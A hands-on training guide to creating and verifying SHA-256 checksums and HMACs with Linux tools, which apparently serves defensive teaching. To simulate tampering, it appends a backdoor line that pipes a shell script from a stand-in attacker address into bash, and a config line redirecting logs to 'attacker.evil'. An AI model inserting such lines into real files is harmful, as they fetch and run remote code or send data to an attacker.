# Guide 02: Creating and Verifying File Hashes

> **Level:** Basic
> **Time:** 25 minutes
> **Prerequisites:** Reading sections 6 (Hashing)
> **Tools:** Docker, sha256sum, sha1sum, md5sum, openssl dgst

---

## Learning Objectives

* Generate cryptographic hashes using standard Linux tools
* Create and use SHA-256 checksum files for integrity verification
* Detect file tampering using hash comparison
* Understand when MD5/SHA-1 are acceptable vs. when SHA-256 is required
* Use HMAC for authenticated integrity checking

---

## Setup

```console
docker run --rm -it ubuntu:22.04 bash
apt-get update -q && apt-get install -y openssl python3 coreutils 2>/dev/null | tail -3
mkdir -p /hashing && cd /hashing
```

---

## Exercise 1: Basic Hash Generation

### Create test files

```console
# Create three files with known content
echo "Malware analysis report - sample 001" > report_001.txt
echo "Malware analysis report - sample 002" > report_002.txt
cp report_001.txt report_001_copy.txt  # identical copy
```

### Generate hashes with different algorithms

```bash
echo "=== MD5 (128-bit) — BROKEN, do not use for security ==="
md5sum report_001.txt report_002.txt report_001_copy.txt

echo ""
echo "=== SHA-1 (160-bit) — BROKEN, do not use for security ==="
sha1sum report_001.txt report_002.txt report_001_copy.txt

echo ""
echo "=== SHA-256 (256-bit) — Recommended ==="
sha256sum report_001.txt report_002.txt report_001_copy.txt

echo ""
echo "=== SHA-512 (512-bit) — High security ==="
sha512sum report_001.txt report_002.txt report_001_copy.txt
```

**Questions to answer:**

* Do `report_001.txt` and `report_001_copy.txt` have the same hash? Why?
* Do `report_001.txt` and `report_002.txt` have the same hash? Why not?

---

## Exercise 2: The Avalanche Effect

```bash
python3 << 'EOF'
import hashlib

messages = [
    "The quick brown fox jumps over the lazy dog",
    "The quick brown fox jumps over the lazy Dog",  # capital D
    "The quick brown fox jumps over the lazy do",   # missing 'g'
    "The quick brown fox jumps over the lazy dog.",  # added '.'
]

print(f"{'Message':<50} {'SHA-256 (first 20 chars)'}")
print("-" * 75)
for msg in messages:
    h = hashlib.sha256(msg.encode()).hexdigest()
    print(f"{msg:<50} {h[:20]}...")

print()
print("Notice: a single character change produces a completely different hash.")
print("This is the AVALANCHE EFFECT — essential for tamper detection.")
EOF
```

---

## Exercise 3: File Integrity Verification Workflow

This is a real-world workflow: you download software and verify its hash matches what the vendor published.

### Step 1: Simulate vendor releasing software with checksums

```bash
# "Vendor" creates the software and publishes checksums
cat > security_tool_v2.1.sh << 'EOF'
#!/bin/bash
# Security Analysis Tool v2.1 - OFFICIAL RELEASE
echo "Installing SOC analysis tools..."
echo "This is the legitimate, vendor-signed software."
# ... (actual installation logic)
EOF

# Vendor publishes the SHA-256 checksum
sha256sum security_tool_v2.1.sh > security_tool_v2.1.sh.sha256
echo "Vendor's published checksum:"
cat security_tool_v2.1.sh.sha256
```

### Step 2: Simulate downloading and verifying

```console
# "You" download the files and verify
echo "Verifying download integrity..."
sha256sum --check security_tool_v2.1.sh.sha256
```

### Step 3: Simulate an attacker tampering with the software

```console
# Attacker modifies the software
cat >> security_tool_v2.1.sh << 'EOF'

# BACKDOOR INJECTED BY ATTACKER
curl -s http://192.168.1.100:4444/shell | bash
EOF

echo "Attacker modified the file. Verifying again..."
sha256sum --check security_tool_v2.1.sh.sha256 && echo "DANGER: Verification passed!" || echo "TAMPER DETECTED: Checksum mismatch!"
```

### Step 4: Attacker also modifies the checksum file

```console
# If the attacker can also modify the checksum file, verification fails
echo "What if attacker updates the checksum file too?"
sha256sum security_tool_v2.1.sh > security_tool_v2.1.sh.sha256
sha256sum --check security_tool_v2.1.sh.sha256 && echo "Checksum passes — but software is still malicious!"

echo ""
echo "This is why checksums MUST be obtained from a separate trusted source"
echo "(publisher's website, signed email, different server, etc.)"
```

---

## Exercise 4: Hashing Multiple Files — Software Distribution

```bash
# Create a mock software release directory
mkdir -p release_v3.0
cat > release_v3.0/soc_monitor.py << 'EOF'
#!/usr/bin/env python3
# SOC Monitor v3.0
print("Starting SOC monitoring agent...")
EOF

cat > release_v3.0/config.yaml << 'EOF'
version: 3.0
log_level: INFO
output: /var/log/soc_monitor.log
EOF

cat > release_v3.0/README.txt << 'EOF'
SOC Monitor v3.0
Install: python3 soc_monitor.py --install
EOF
```

```console
# Create a comprehensive checksum manifest
cd release_v3.0
sha256sum soc_monitor.py config.yaml README.txt > ../SHA256SUMS
cd ..

echo "SHA256SUMS manifest:"
cat SHA256SUMS
```

```console
# Verify all files at once
sha256sum --check SHA256SUMS
```

```console
# Simulate partial tampering (only config changed)
echo "siem_endpoint: http://attacker.evil/collect" >> release_v3.0/config.yaml

echo "Verifying after config change:"
sha256sum --check SHA256SUMS 2>&1
```

---

## Exercise 5: OpenSSL Hash Commands

```bash
echo "=== OpenSSL digest commands ==="

# OpenSSL can compute many hash types
echo -n "test data" | openssl dgst -md5
echo -n "test data" | openssl dgst -sha1
echo -n "test data" | openssl dgst -sha256
echo -n "test data" | openssl dgst -sha384
echo -n "test data" | openssl dgst -sha512
echo -n "test data" | openssl dgst -sha3-256

echo ""
echo "Hash a binary file:"
openssl dgst -sha256 /bin/ls

echo ""
echo "List all available digest algorithms:"
openssl list -digest-algorithms 2>/dev/null | grep -E "SHA|MD|BLAKE" | head -15
```

---

## Exercise 6: HMAC for Authenticated Hashes

A plain hash provides integrity but NOT authenticity.
An attacker who can modify a file can also recompute the hash.
HMAC uses a shared secret key to prevent this.

```bash
SHARED_KEY="SOC_API_Secret_Key_2024"

# Create an API request payload
PAYLOAD='{"action":"block_ip","ip":"185.220.101.47","reason":"tor_exit","analyst":"alice"}'

echo "API Payload: $PAYLOAD"
echo ""

# Compute HMAC
HMAC=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$SHARED_KEY" | awk '{print $2}')
echo "HMAC-SHA256: $HMAC"

echo ""
echo "Server receives: payload + HMAC"
echo "Server verifies: recomputes HMAC with shared key"

# Simulate server-side verification
SERVER_HMAC=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$SHARED_KEY" | awk '{print $2}')
if [ "$HMAC" = "$SERVER_HMAC" ]; then
  echo "HMAC verification: PASSED — request is authentic"
fi

echo ""
echo "Attacker modifies payload (changing IP)..."
MODIFIED_PAYLOAD='{"action":"block_ip","ip":"10.0.0.1","reason":"tor_exit","analyst":"alice"}'
ATTACKER_HMAC=$(echo -n "$MODIFIED_PAYLOAD" | openssl dgst -sha256 -hmac "WRONG_KEY" | awk '{print $2}')
if [ "$HMAC" != "$ATTACKER_HMAC" ]; then
  echo "HMAC verification: FAILED — tampering detected!"
fi
```

---

## Exercise 7: Real-World Scenarios

### Scenario: Malware Hash Lookup

```bash
python3 << 'EOF'
import hashlib

# Simulated malware file (we use known content for demo)
# In reality you'd hash an actual suspicious file
suspicious_content = b"""MZ\x90\x00\x03\x00\x00\x00This program cannot be run in DOS mode.
Suspicious executable content here
CreateRemoteThread VirtualAllocEx WriteProcessMemory"""

md5_hash    = hashlib.md5(suspicious_content).hexdigest()
sha1_hash   = hashlib.sha1(suspicious_content).hexdigest()
sha256_hash = hashlib.sha256(suspicious_content).hexdigest()

print("Suspicious file hashes:")
print(f"  MD5:    {md5_hash}")
print(f"  SHA-1:  {sha1_hash}")
print(f"  SHA-256:{sha256_hash}")
print()
print("Next steps:")
print("  1. Search SHA-256 on VirusTotal: https://www.virustotal.com/gui/file/<sha256>")
print("  2. Search on MalwareBazaar: https://bazaar.abuse.ch/")
print("  3. Add hash to SIEM as indicator of compromise (IOC)")
print("  4. Search SIEM/EDR for any other machines with this file hash")
print("  5. Create detection rule: alert if file with this SHA-256 executes")
EOF
```

---

## Summary Table

| Command | Algorithm | Use Case |
|---------|-----------|---------|
| `md5sum file` | MD5 128-bit | Legacy checksums (non-security) |
| `sha1sum file` | SHA-1 160-bit | Legacy checksums (non-security) |
| `sha256sum file` | SHA-256 256-bit | **Standard** integrity verification |
| `sha512sum file` | SHA-512 512-bit | High security, larger output |
| `sha256sum --check file.sha256` | SHA-256 | Verify against saved checksums |
| `openssl dgst -sha256 file` | SHA-256 | Alternative, more options |
| `openssl dgst -sha256 -hmac KEY` | HMAC-SHA256 | Authenticated integrity |

---

## Self-Check Questions

1. You download a file and compute `sha256sum download.tar.gz`. The result matches the hash published on the vendor's website. Is the file definitely safe? Why or why not?
1. Why can't a simple SHA-256 hash (without HMAC) prevent an attacker who has control of both the file and the hash file from forging an integrity check?
1. An IOC report lists an MD5 hash. Should you trust this as a reliable indicator? When might it be unreliable?
1. A developer says "we hash passwords with SHA-256 to protect them." What is wrong with this approach?
1. How does HMAC differ from a plain hash, and what does it protect against?
